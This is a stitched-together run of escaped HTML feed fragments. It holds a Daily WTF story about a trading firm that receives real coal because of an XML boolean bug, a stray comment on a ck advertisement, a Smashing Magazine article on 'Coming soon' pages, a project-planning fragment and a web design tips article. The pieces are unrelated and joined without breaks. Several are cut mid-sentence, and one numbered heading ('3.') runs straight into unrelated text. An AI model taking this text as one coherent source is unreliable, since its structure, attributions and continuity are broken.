Duke Brothers by hauling around Frozen Concentrated Orange Juice (FCOJ); instead, they worked the commodities market by buying and selling FCOJ <em>futures contracts</em>. Actually, that’s really the only way to trade in commodities.</p>\n<p>A futures contract is pretty straight forward: you agree to buy X units of commodity Y at $N per unit at some fixed future date. While it might seem a bit strange for an individual to agree to buy twenty tons of pork bellies in April for $34,420 (even if he <em>really</em> loves bacon), the idea is to sell the to-be-delivered pork bellies long before April, and to sell them for more than $34,420. Just about every conceivable commodity is bought and sold in this manner long before the commodity is even produced. The whole point of all this trading is to shift the risk (and rewards) of fluctuating commodity prices from the producers (farmers, miners, etc) to the traders.</p>\n<p>Of course, because commodity traders don’t <em>actually</em> want to be stuck with tons and tons of pork bellies, a whole series of middlemen — from the brokers to the exchanges to the clearing houses — work hard to ensure that, when you say &quot;I’ll buy 300 tons of pork bellies for $518,000 in May,&quot; you don’t actually buy 300 tons of pork bellies for $518,000 in May.</p>\n<p>Brokers, for example, will set up round-turn trades so that, for each futures contract purchased, an offsetting contract can be sold to whoever actually wants to buy the goods. The exchange’s automated trading systems have all sorts of rules-engines to make sure that obvious errors (like delivering truckloads of commodities to a commercial office park) don’t slip through. And finally, processors at the clearing house will double-check transactions to make sure they weren’t sent over in error.</p>\n<p>All that said, it’s almost impossible for traders to <em>actually</em> buy the commodities they are buying. Well, <em>almost</em> impossible.</p>\n<h3 style=\"margin-bottom:0px\">A Perfect Storm</h3>\n<p style=\"margin-top:0px\">Æxecor traded coal on only one exchange (the WTFSE), and they didn’t trade coal very often. As such, when WTFSE upgraded its public-facing, WebService-based API, Æxecor’s internal trading system could no longer communicate with it. With a couple pending coal trades, this presented a bit of a problem.</p>\n<p>Fortunately, Æxecor had a staff of crack programmers, and they were able to hack together a solution that worked with the WTFSE’s new API. Essentially, the coder added a bit of XML to their trading requests, including this following snippet.</p>\n<blockquote>\n<pre>\n&lt;AdditionalProperties&gt;\n   &lt;PhysicallyDeliver&gt;\n      &lt;value&gt;False&lt;/value&gt;\n   &lt;/PhysicallyDeliver&gt;\n&lt;/AdditionalProperties&gt;\n\n</pre>\n</blockquote>\n<p>Notice anything off about that XML? If you said, “value should be 0 instead of False”, then give yourself a pat on the back. As it turned out, WTFSE only recognized 1’s and 0’s to represent True and False and, if the value was nether 1 nor 0, it simply defaulted to 1. Whoops!</p>\n<p>Now, this normally wouldn’t have been that big of a deal; to ensure accurate transactions, the WTFSE (and just about all other exchanges) sends back a trade confirmation with all of the original information encoded in their XML. That way, both parties have to understand each other’s data. On Æxecor&#39;s end, everything looked hunky dory, especially as a result of the following line of code.</p>\n<blockquote>\n<pre>\nbool physicallyDeliver = \n    (getNodeVal(&quot;PhysicallyDeliver&quot;).toLower() == &quot;true&quot;);</pre>\n</blockquote>\n<p>Kudos to the developer for verifying the correct case... but, a string can be infinitely more things than simply &quot;true&quot; or &quot;false&quot;. Such as &quot;1&quot; or &quot;0&quot;. Whoops.</p>\n<p>Even a mistakenly confirmed incorrect trade shouldn’t have been <em>that</em> big of a deal, since the clearing house would notice some pretty big problems with the trade. You can’t just call up FedEx and request delivery of thousands upon thousands of tons of raw material to some office complex downtown. Commodities can only be delivered to a fixed number of delivery points, such as warehouses adjacent to train yards or ports. Of course, since Æxecor’s offices were in located on Pier 53, a recently redeveloped warehouse district off the river, it would have seemed like the logical place to accept delivery of a whole bunch of coal, especially to a rules engine. Whoops.</p>\n<p>Fortunately, the commodity futures trading market doesn’t rely entirely on software. There are back-office personnel on both sides of the transaction (and several places in the middle) to make sure that a trader doesn’t do something silly like accidently click the “physically deliver” checkbox, enter into round-turn trades that creates an instant net loss, and so on.</p>\n<p>So with everyone looking over transactions, you’d think that <em>someone</em> along the way would have noticed that trading giant Æxecor asked for physical delivery of a million-and-a-half dollars worth of coal. Actually, someone probably did, but because the trade came from Brad, there was just no way it could be made in err.</p>\n<p>As <i>the</i> senior trader at Æxecor, Brad made it <em>very</em> clear that no one — “not even His Holiness, the Pope” — shall question his trades. After all, Brad makes complex trading decisions that no one else could possibly comprehend. Sometimes he buys high and sells low. Sometimes he holds in a decline. Sometimes he refuses to sell at any price. Brad works in mysterious ways, and if he said “do it”, then it better get done.</p>\n<h3 style=\"margin-bottom:0px\">An Early Christmas</h3>\n<p style=\"margin-top:0px\">“Now don’t go telling me that this coal ain’t yours,” the workman said defensively, sensing something was awry. “I mean, if you don’t want it, that’s your business. But this here is your coal, mister Brad.”</p>\n<p>As much as Brad wanted to deny it, he knew it was his. And not only that, but he had haughtily confirmed, re-confirmed, and re-re-confirmed with Æxecor’s own back-office processing team. He had just assumed, like he always did, that the mouth-breathing paper-pushers couldn’t read English. As he played back the last thing he told one of the processors about the coal order – “what part of ‘execute my f*ing trade’ don’t you understand!?” – he wondered what he could possibly do with 56,000,000 pounds of <em>real</em> coal.</p>\n<p>Try to imagine for a moment how <em>you</em> would unload a mountain of coal worth million-and-a-half dollars. Craigslist does have its limits, after all.</p>\n<p>As it turned out, it was more difficult than Brad could have <em>ever</em> imagined to sell real coal. The commodities market really only deals in futures, and everyone who actually needs 28,000 tons of coal has bought it long in advance. And besides, who wants to buy coal from some guy named Brad? Eventually, after paying exorbitant wharfing, shipping, environmental, docking, unloading, loading, and multiple-fee fees, Brad was finally able to unload it for twenty cents on the dollar.</p>\n<p>Ever since “The Big Purchase”, Brad has never been able to live down his mountain of coal. Every time he passed others in the hallway, he knew that they knew about the coal, and they knew that he knew that they knew. No one really poked fun or laughed at him, but it didn’t matter. Brad was no longer thought of <i>the</i> senior trader at Æxecor; instead, he was the guy who accidently bought all that coal.</p><p><iframe src=\"http://feedads.g.doubleclick.net/~ah/f/iboioueglnmiqal0k0nsmcvarc/468/60#http%3A%2F%2Fthedailywtf.com%2FArticles%2FSpecial-Delivery.aspx\" width=\"100%\" height=\"60\" frameborder=\"0\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\"></iframe></p><div>\n<a href=\"http://syndication.thedailywtf.com/~ff/TheDailyWtf?a=7WNuLM08t1Q:PzILG5m0aYo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/TheDailyWtf?d=yIl2AUoC8zA\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/TheDailyWtf/~4/7WNuLM08t1Q\" height=\"1\" width=\"1\">"

I for one think the commercial is fantastic. ck has never been about advertising their product, but rather advertising the people who use their product. They attack a mindset, a certain kind of people, and associate their product with them. Instead of buying jeans, you are buying into a life style, a persona. They are a statement of who you are. That I believe is their intention and this add is perfect for conveying all that.</div>"

Leaving up your domain registrar or Web host’s generic page seems unprofessional, especially if you’re trying to drum up advance press for your new project. At the same time, you don’t want to spend too much time on a temporary page when you really should be working on the website itself.</p><p>The best thing to do is create a simple <strong>“Coming soon” page</strong> to notify visitors of what will eventually be there. Good “Coming soon” pages come in two basic varieties: the informational design, which simply tells visitors what will be there after launch; and the page that invites early visitors to sign up for updates or even to request a beta (or alpha) invitation. Below are some great examples of each, followed by some best practices for creating your own “Coming soon” page. You definitely won’t see among these the generic “Under construction” page (with the cute construction graphic) that used to litter the Web.</p><h3>1. Tips On Designing A Good “Coming Soon” Page</h3><p>Here are some best practices and tips to keep in mind when designing your own “Coming soon” pages, as well as examples.</p><h4>Tell Us What to Expect</h4><p>When someone lands on your “Coming soon” page, they should get an idea of what your website will be about and why it might be useful to them. This is especially important if you’re asking visitors to sign up for updates or to check back regularly. If we can’t tell what the website is for, why would we bother coming back?</p><p>Give us at least some indication of the website’s purpose. This doesn’t mean you have to spell out everything the website will offer; rather, hint that it’s something we might be interested in. For example, if you will be offering a time management app specifically for Web designers, you might say that the website will help streamline the workflow of Web designers. It gives a taste of what the website will do, while maintaining some mystery.</p><p><a href=\"http://kissmetrics.com/\">KISSmetrics</a><br>KISSmetrics provides a ton of information on its “Coming soon” page, including a form to sign up for updates and a blog to keep abreast of new developments. It’s a great example of a “Coming soon” page that keeps visitors informed and gets them excited about the pending launch.</p><p><a href=\"http://kissmetrics.com/\"><img alt=\"KISSmetrics\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/kissmetrics.jpg\" width=\"500\" height=\"498\"></a></p><p><a href=\"http://birdboxx.com/\">Birdboxx</a><br>Birdboxx gives a basic explanation of the services it will provide when the website launches.</p><p><a href=\"http://birdboxx.com/\"><img alt=\"Birdboxx\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/birdboxx.jpg\" width=\"500\" height=\"408\"></a></p><p><a href=\"http://www.anipals.co.uk/\">Anipals</a><br>Anipals gives plenty of information on the website’s features without giving away too much.</p><p><a href=\"http://www.anipals.co.uk/\"><img alt=\"Anipals\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/anipals.jpg\" width=\"500\" height=\"390\"></a></p><p><a href=\"http://novalistic.com/\">Novalistic</a><br>This “Coming soon” page explains what the new page will be about, when it will be released and also allows its visitors to sign up for the future updates.</p><p><a href=\"http://novalistic.com/\"><img alt=\"Novalistic\" src=\"http://media.smashingmagazine.com/wp-content/uploads/2009/11/novalistic.jpg\" width=\"500\" height=\"460\"></a></p><h4>Should You Provide Updates?</h4><p>Letting visitors sign up by email to be notified on the website’s launch can be a useful marketing tool. If you don’t offer this feature, by the time your website does launch, those visitors may have forgotten about you. Of course, how often you send out an update is entirely up to you. Some websites send out an announcement only when the website has actually launched. Others send out regular updates on the progress of website’s development.</p><p>If you’re trying to build advance buzz around your website’s launch (which, in all likelihood, you are), then sending updates on a semi-regular basis could go a long way to building your website’s credibility and name recognition. If you send an update every week or two, your prospects likely won’t forget about you. Just indicate on the sign-up page that updates will be sent that often, to avoid being labeled a spammer.</p><p>You have a couple of alternatives to the standard email sign-up form, though. One is to run a blog that keeps visitors updated on your progress. This is most commonly done for Web apps, with the blog offering regular updates on development. Another common method is to use a <a href=\"http://twitter.com\">Twitter</a> account to keep prospective users updated. Just make sure that the link on your page to your Twitter account is prominent.</p><p><a href=\"http://www.mynitelife.co.uk/\">MyNiteLife</a><br>MyNiteLife lets visitors sign up for updates via email.</p><p><a href=\"http://www.mynitelife.co.uk/\"><img alt=\"My Nite Life\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/mynitelife.jpg\" width=\"500\" height=\"343\"></a></p><p><a href=\"http://designsvn.com/\">DesignSvn</a><br>DesignSvn gives visitors the option to sign up for updates via email or to follow it on Twitter.</p><p><a href=\"http://designsvn.com/\"><img alt=\"DesignSvn\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/designsvn.jpg\" width=\"500\" height=\"333\"></a></p><p><a href=\"http://remindness.com/\">Remindness</a><br>Remindness lets visitors sign up for email updates.</p><p><a href=\"http://remindness.com/\"><img alt=\"Remindness\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/remindness.jpg\" width=\"500\" height=\"310\"></a></p><h4>Brand Your “Coming Soon” Page</h4><p>If you already have a logo, a basic design or color scheme and font picked out, include them on your landing page to start building the brand in your visitors’ minds. Advance branding sets your website apart from your competitors and generally doesn’t cost any more to implement or take additional time. Even something as simple as using your website’s eventual font or color scheme can make you much more recognizable to future visitors. When your website finally does launch, it will have an air of familiarity to your visitors.</p><p><a href=\"http://fontdeck.com/\">Fontdeck</a><br>Fontdeck includes its logo and what will presumably be the website’s color scheme on its “Coming soon” page.</p><p><a href=\"http://fontdeck.com/\"><img alt=\"FontDeck\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/fontdeck.jpg\" width=\"500\" height=\"332\"></a></p><p><a href=\"http://silverbackapp.com/holding/\">Silverback</a><br>Silverback used the gorilla cartoon and basic design theme of its website on this “Coming soon” page.</p><p><a href=\"http://silverbackapp.com/holding/\"><img alt=\"Silverback\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/silverback.jpg\" width=\"500\" height=\"287\"></a></p><p><a href=\"http://www.foundationsix.com/\">Foundation Six</a><br>Foundation Six uses what will presumably end up as its logo and color scheme.</p><p><a href=\"http://www.foundationsix.com/\"><img alt=\"Foundation Six Web Design Studio\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/foundationsix.jpg\" width=\"500\" height=\"286\"></a></p><h4>Create Some Intrigue</h4><p>The point of your “Coming soon” page is to get people to talk about, and come back to, your website. Even if you want to give some information on what the website will be about, creating some mystery around the launch is helpful. Curiosity is a great motivator and may get more people to sign up for updates. It also gets people talking, because visitors will ask their friends if they have any new information about the pending launch. Advance buzz can bolster your launch traffic and even attract media attention.</p><p><a href=\"http://www.betterblogger.net/\">Better Blogger</a><br>Better Blogger gives us a basic idea of what its web site will be about without giving away too much.</p><p><a href=\"http://www.betterblogger.net/\"><img alt=\"Better Blogger\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/betterblogger.jpg\" width=\"500\" height=\"443\"></a></p><p><a href=\"http://elliotjaystocks.com/goodmorning/\">Good Morning</a><br>Good Morning gives away virtually no information about what the app might do, but the name suggests that it might be related to time management or productivity.</p><p><a href=\"http://elliotjaystocks.com/goodmorning/\"><img alt=\"Good Morning\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/goodmorning.jpg\" width=\"500\" height=\"332\"></a></p><p><a href=\"http://www.uooo.tv/\">uoOo</a><br>uoOo seems to be somehow related to video, but it doesn’t give us any more information than that.</p><p><a href=\"http://www.uooo.tv/\"><img alt=\"uoOo TV\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/uooo.jpg\" width=\"500\" height=\"286\"></a></p><h4>Remember SEO</h4><p>While a “Coming soon” page won’t likely make a big difference in your search engine ranking, that’s no reason not to optimize it for search engines. Use keywords and proper meta tags, and encourage those linking to your website to use good anchor text. And if you use good SEO practices to begin with, you won’t be penalized by search engines (and might even gain some decent credibility among search engines), meaning that when your website does launch, its search engine ranking will climb that much faster.</p><h3>2. Informational Designs</h3><p>Informational designs do what you would expect: inform early visitors about the current and future status of your domain. This design can be very simple, with just a name and text like “Coming soon,” or it might go more in depth. In either case, it is usually a single page, sometimes with an additional information page. In some cases, it also includes the owner’s contact information.</p><p><a href=\"http://headscape.co.uk/holding/index.html\">Boagworld</a><br>A great design with basic information about the return of a well-known podcast.</p><p><a href=\"http://headscape.co.uk/holding/index.html\"><img alt=\"Boagworld\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/boagworld.jpg\" width=\"500\" height=\"286\"></a></p><p><a href=\"http://fivesecondprojects.com/\">FiveSecondProjects</a><br>This website takes a slightly different approach, providing a link to a video with more information.</p><p><a href=\"http://fivesecondprojects.com/\"><img alt=\"FiveSecondProjects\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/fivesecondprojects.jpg\" width=\"500\" height=\"345\"></a></p><p><a href=\"http://www.aftersomewords.com/\">After Some Words</a><br>A unique “Coming soon” page that links to the website’s MySpace page.</p><p><a href=\"http://www.aftersomewords.com/\"><img src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/aftersomewords.jpg\" height=\"367\" width=\"500\"></a></p><p><a href=\"http://www.holeycoww.co.uk/\">Holey Coww</a><br>This page include a quite lengthy introduction to the site as well as links to Twitter and Facebook.</p><p><a href=\"http://www.holeycoww.co.uk/\"><img src=\"http://media.smashingmagazine.com/wp-content/uploads/2009/11/holeycow.jpg\" height=\"474\" width=\"500\"></a></p><p><a href=\"http://www.zombiecorp.com/\">Zombie Corp</a><br>Another very simple “Coming soon” page, with contact info of the owners.</p><p><a href=\"http://www.zombiecorp.com/\"><img alt=\"Zombie Corp\" src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/zombiecorp.jpg\" width=\"500\" height=\"332\"></a></p><p><a href=\"http://www.mosesmehraban.com/\">Moses Mehraban</a><br>A simple page that gives information about the website owner’s current business activities.</p><p><a href=\"http://www.mosesmehraban.com/\"><img src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/mosesmehraban.jpg\" height=\"289\" width=\"500\"></a></p><p><a href=\"http://www.leaf-ordinary.de/\">Leaf Ordinary</a><br>A minimalist page with a link to more information.</p><p><a href=\"http://www.leaf-ordinary.de/\"><img src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/leafordinary.jpg\" height=\"371\" width=\"500\"></a></p><p><a href=\"http://www.iheartspaceships.com/\">I heart spaceships</a><br>A fun page that includes contact information for the website’s developers.</p><p><a href=\"http://www.iheartspaceships.com/\"><img src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/iheartspaceships.jpg\" height=\"284\" width=\"500\"></a></p><p><a href=\"http://www.smart-pixel.ro/\">Smart Pixel</a><br>A very minimalist page design, but with a fun twist.</p><p><a href=\"http://www.smart-pixel.ro/\"><img src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/smartpixel.jpg\" height=\"371\" width=\"500\"></a></p><p><a href=\"http://www.humanbinary.com/\">Human Binary</a><br>Another really fun page design that gives plenty of information on what the website will eventually hold.</p><p><a href=\"http://www.humanbinary.com/\"><img src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/humanbinary.jpg\" height=\"390\" width=\"500\"></a></p><p><a href=\"http://fcukstar.com/\">fcukstar</a><br>A more advanced page that includes a link to a website preview and pricing information.</p><p><a href=\"http://fcukstar.com/\"><img src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/fcukstar.jpg\" height=\"415\" width=\"500\"></a></p><p><a href=\"http://www.zenbou.com/\">Zenbou</a><br>Another very minimalist design that includes plenty of hints on what the upcoming website will include, as well as a link to the Twitter feed.</p><p><a href=\"http://www.zenbou.com/\"><img src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/zenbou.jpg\" height=\"284\" width=\"500\"></a></p><p><a href=\"http://www.shabithishan.com/\">Shabith Ishan</a><br>A very well-designed page, with links to various social media feeds.</p><p><a href=\"http://www.shabithishan.com/\"><img src=\"http://media.smashingmagazine.com/wp-content/uploads/images/coming-soon/shabithishan.jpg\" height=\"383\" width=\"500\"></a></p><h3>3.

They’re especially popular for online apps, but other websites use them as well. Sign-up forms are generally short, with a field for an email address and maybe one for a name.

You can elaborate a list with a certain number of items that describe <em>what</em> you have to do.</p>\n<p><strong>Planning:</strong> for each item you identified in the previous step, plan a <em>start date</em> and <em>finish date</em>. Prepare a daily to-do list to set milestones and measure your progresses during development and test phase.</p>\n<p><strong>Development and Test:</strong> write and test implemented features. Proceed following the daily plan you elaborated in the previous step. Measure your progress day by day and re-plan activities if it’s necessary. Communicate weekly to client your progresses or significant changes about the release date of the project. </p>\n<p><strong>Check:</strong> do a final “massive” test stressing all implemented features. Do a final check involving client.</p>\n<p><strong>Release and Follow-up:</strong> release the final product and monitor the follow-up. Get client feedback.</p>\n<h2>Sponsored Links</h2>\n\n\n<div style=\"font-size:0px;height:0px;line-height:0px;margin:0;padding:0;clear:both\"></div><div>\n<a href=\"http://feeds.feedburner.com/~ff/Woork?a=Me1ZKmWbw9c:YqrYFYOqkyU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/Woork?d=yIl2AUoC8zA\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Me1ZKmWbw9c:YqrYFYOqkyU:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/Woork?i=Me1ZKmWbw9c:YqrYFYOqkyU:F7zBnMyn0Lo\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Me1ZKmWbw9c:YqrYFYOqkyU:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/Woork?i=Me1ZKmWbw9c:YqrYFYOqkyU:gIN9vFwOqvQ\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Me1ZKmWbw9c:YqrYFYOqkyU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/Woork?i=Me1ZKmWbw9c:YqrYFYOqkyU:V_sGLiPBpWU\" border=\"0\"></a> <a href=\"http://feeds.feedburner.com/~ff/Woork?a=Me1ZKmWbw9c:YqrYFYOqkyU:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/Woork?d=qj6IDK7rITs\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/Woork/~4/Me1ZKmWbw9c\" height=\"1\" width=\"1\">"

The average person may not be able to explain the tangible differences that make up great design, but they can usually spot a design they like. By examining some awesome sites, I’ll attempt to put my finger on some of the small details that make up the difference.</p>\n<p>A little while back I wrote an article about the <a href=\"http://www.myinkblog.com/2009/03/21/4-principles-of-good-design-for-websites/\">4 Principles of Good Design for Websites</a>, this article is somewhat of a continuation of those principles. In that article I went into detail about the important roles that contrast, repetition, alignment and proximity play in webdesign. This article will piggy back on those principles as I examine 6 ways you can take your webdesign from good to great.</p>\n<p>This post is chock full of awesome examples. I made a conscience effort to only pick sites that were great all the way around.</p>\n<h2><a name=\"gradients\"></a>1. Make Subtle Use of Gradients</h2>\n<p>I’m not sure if there is an effect that can be butchered and make your site look more amateurish than poor use of gradients. Nothing screams bad design quite like a rainbow gradient (well perhaps blinking text is of equal prowess). That being said, the use of subtle gradients will go a long way toward making your site look great. The key is using them sparingly within the flow of the design. </p>\n<h3>Gradient Meets Bokeh Effect</h3>\n<p>The <a href=\"http://www.newism.com.au/\">Newism</a> site features a colorful, but subtle gradient that is seamlessly mixed with a faint <a href=\"http://en.wikipedia.org/wiki/Bokeh\">bokeh effect</a>. It’s visually stunning. Just as a side note, if you are interested in recreating a bokeh effect in photoshop, be sure to check out <a href=\"http://abduzeedo.com/awesome-digital-bokeh-effect-photoshop\">Abduzeedo’s tutorial</a> on it.</p>\n<p><a href=\"http://www.newism.com.au/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/newism.jpg\" alt=\"Newism\" title=\"Newism\" width=\"575\" height=\"400\"></a></p>\n<h3>Subtle Gradients, Shadows and Textures… Oh My!</h3>\n<p>The guys at <a href=\"http://onwired.com/\">OnWired</a> flat-out make awesome websites, so it stands to reason their personal site would be top notch. To go along with plenty of personality throughout, the design itself is spot-on. Check out the use of subtle gradients and shadows in the design. I also love the touch of grunge and texture that is sprinkled in.</p>\n<p><a href=\"http://onwired.com/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/onwired.jpg\" alt=\"OnWired\" title=\"OnWired\" width=\"575\" height=\"400\"></a></p>\n<h2><a name=\"white-space\"></a>2. Add White Space</h2>\n<p>The term white space is often misunderstood to literally mean white space. In terms of design it is more accurately described as the space between elements. To break it down even further here is how the folks at <a href=\"http://www.alistapart.com/\">A List Apart</a> define it.</p>\n<blockquote><p>“Whitespace,” or “negative space” is the space between elements in a composition. More specifically, the space between major elements in a composition is “macro whitespace.” Micro whitespace, is—yes, you’ve guessed it—the space between smaller elements: between list items, between a caption and an image, or between words and letters. The itty-bitty stuff.</p></blockquote>\n<p>It cannot be understated just how important it is to let elements breathe in your design. This is probably the single biggest issue for young designers. It’s human nature to try to cram every design element into a small area, fortunately for webdesigners (despite every clients unrelenting belief) there is no such thing as a fold in webdesign, that’s what scroll bars are for… /* end rant */</p>\n<h3>Excellent Spacing &amp; Subtle Line Breaks</h3>\n<p><a href=\"http://www.snook.ca/\">Snook</a> provides a comfy level of padding to break up all the post entries. Also notice the faint line breaks that provide separation, but are easy on the eyes and flow with the overall design. </p>\n<p><a href=\"http://www.snook.ca/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/snook.jpg\" alt=\"Snook\" title=\"Snook\" width=\"575\" height=\"502\"></a></p>\n<h3>Beautiful Minimalistic Approach</h3>\n<p><a href=\"http://www.madebysofa.com/\">Made By Sofa</a> features a beautiful minimalistic approach. The spacing is fluent, and they use an image with no background or clutter to speak loudly.</p>\n<p><a href=\"http://www.madebysofa.com/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/we-are-sofa.jpg\" alt=\"We are Sofa\" title=\"We are Sofa\" width=\"575\" height=\"430\"></a></p>\n<h2><a name=\"grid\"></a>3. Stay On A Grid</h2>\n<p>The inspiration for grid based designs can best be attributed to newspapers, but if you look closer you can find grids in all kinds of things. From most websites to traffic grids.</p>\n<p><a href=\"http://www.960.gs\">The 960 grid</a> and <a href=\"http://www.blueprintcss.org/\">Blueprint</a> are probably the two most popular grid frameworks. I personally love the 960 grid, it’s simple, light weight and a nice starting point.<a href=\"http://www.myinkblog.com/2009/02/24/design-a-fresh-blog-theme-on-the-960-grid/\"> I design with it a lot of the time</a>, but a grid just means that you have some rhyme and reason to your site elements. Alignment plays an intricate role in making your site look refined. Nothing in webdesign should be placed without purpose or alignment to another element.</p>\n<h3>Griding A Portfolio</h3>\n<p><a href=\"http://www.poccuo.com/\">Poccuo</a> features their portfolio on their home page. They use a beautiful mix of a 3 column and 5 column look. It’s well spaced and visually appealing.</p>\n<p><a href=\"http://www.poccuo.com/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/poccuo.jpg\" alt=\"Poccuo\" title=\"Poccuo\" width=\"575\" height=\"454\"></a></p>\n<h3>Columns Within A Design Blog</h3>\n<p>I love how <a href=\"http://www.webdesignledger.com\">Web Design Ledger</a> presents their posts on their home page. The newest post is large and featured at the top, the next few are shown in a 3 column grid. </p>\n<p><a href=\"http://www.webdesignledger.com\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/web-design-ledger.jpg\" alt=\"Web Design Ledger\" title=\"Web Design Ledger\" width=\"575\" height=\"498\"></a></p>\n<h3>Lots of Equal Length Columns</h3>\n<p><a href=\"http://ecoki.com/\">Ecoki</a> is a beautiful grid design layout. The 4 column, 2 row layout is obvious, but the slideshow/thumbnails and latest reviews are also on a grid.</p>\n<p><a href=\"http://ecoki.com/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/ecoki.jpg\" alt=\"Ecoki\" title=\"Ecoki\" width=\"575\" height=\"979\"></a></p>\n<h2><a name=\"typography\"></a>4. Improve Your Typography</h2>\n<p>Typography is an artform that is obsessed on by most good designers. It is of prime importance when trying to bring your designs to the next level. Of course it plays an important role in readability, but it’s also quite important to design and mood.</p>\n<h3>Using Contrast To Direct Attention</h3>\n<p><a href=\"http://simplebits.com/\">SimpleBits</a> does a wonderful job of varying contrasts to direct the viewer’s attention. In typography contrast can be altered through font choices, color variances, and size differential.</p>\n<p><a href=\"http://simplebits.com/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/simple-bits.jpg\" alt=\"Simple Bits\" title=\"Simple Bits\" width=\"575\" height=\"400\"></a></p>\n<h3>Nothing Says Typography Like Ampersand Signs</h3>\n<p>This site looks so nice and effortless, but you can tell a lot of thought and reason went into the whole process, and that’s especially evident with the typography. The spacing and font choices are flawless, and I’m enamored with the clever use of Baskerville on the ampersand signs.</p>\n<p><a href=\"http://bunton.com.au/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/bunton.jpg\" alt=\"Bunton\" title=\"Bunton\" width=\"575\" height=\"555\"></a></p>\n<h2><a name=\"effective-navigation\"></a>5. Have Clear and Effective Navigation</h2>\n<p>Good navigation is so important in design. If a user can’t find what they are looking for quick enough, they are probably moving onto the next site. It’s something I’m very weary of, and I know that MyInkBlog could use some improvement on, and it should be drastically improved in the coming redesign.</p>\n<h3>Blog Navigation Via Categories</h3>\n<p>Far too often, blog navigation focuses on pages and leaves the categories as a secondary thought somewhere along the sidebar. <a href=\"http://www.tutorial9.net\">Tutorial9</a> does a fantastic job of realizing users care much more about finding out where their photoshop tutorials are, than where their about us page is. Check out their flawless 2 level navigation with active category highlighting.</p>\n<p><a href=\"http://www.tutorial9.net\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/tutorial-9.jpg\" alt=\"Tutorial 9\" title=\"Tutorial 9\" width=\"575\" height=\"400\"></a></p>\n<h3>Effective Icon Hover Effect</h3>\n<p>Icons can definitely be hit or miss on websites. The web is filled with the remnants of this web 2.0 trend, but not all trends are completely bad. The reason web 2.0 got ugly was because of it’s overuse and amateur use. As with most things, when done properly it really can be quite effective. <a href=\"http://carsonified.com/\">Carsonified</a> displays a clever icon hover effect for it’s navigation. It’s simple and monochromatic and ties in flawlessly with the rest of the site design.</p>\n<p><a href=\"http://carsonified.com/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/carsonified.jpg\" alt=\"Carsonified\" title=\"Carsonified\" width=\"575\" height=\"400\"></a></p>\n<h2><a name=\"useful-footer\"></a>6. Use An Awesome and Useful Footer</h2>\n<p>When the web first started footers were tossed into the junk pile of useless things. They were minor, but necessary evils that needed to be displayed, but little thought went into the design of them. Now they’ve become more and more important to the overall design of a site. Don’t miss out on the opportunity to brand and complete your design through the use of a good footer.</p>\n<h3>Lots of Info &amp; Credentials</h3>\n<p>The main purpose of a footer is to display necessary info about the site and copyright info. <a href=\"http://www.brianhoff.net/\">Brian Hoff</a> adds more personality and interest to his through a 3 column look that displays everything from what he’s working on to books he recommends.</p>\n<p><a href=\"http://www.brianhoff.net/\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/brian-hoff.jpg\" alt=\"Brian Hoff\" title=\"Brian Hoff\" width=\"575\" height=\"406\"></a></p>\n<h3>Search Functionality In A Footer?</h3>\n<p><a href=\"http://elliotjaystocks.com/\">Elliot Jay Stock’s</a> site features an oversized search form in his footer. It’s definitely not a typical place for one, but I think it works for his site. He is also one of the many designers who have taken to featuring their tweets in the footer.</p>\n<p><a href=\"http://www.elliotjaystocks.com\"><img src=\"http://www.myinkblog.com/wp-content/uploads/2009/10/elliot-jay-stocks1.jpg\" alt=\"Elliot Jay Stocks\" title=\"Elliot Jay Stocks\" width=\"575\" height=\"554\"></a></p>\n<h2>Final Thoughts</h2>\n<p>I’d love to hear your 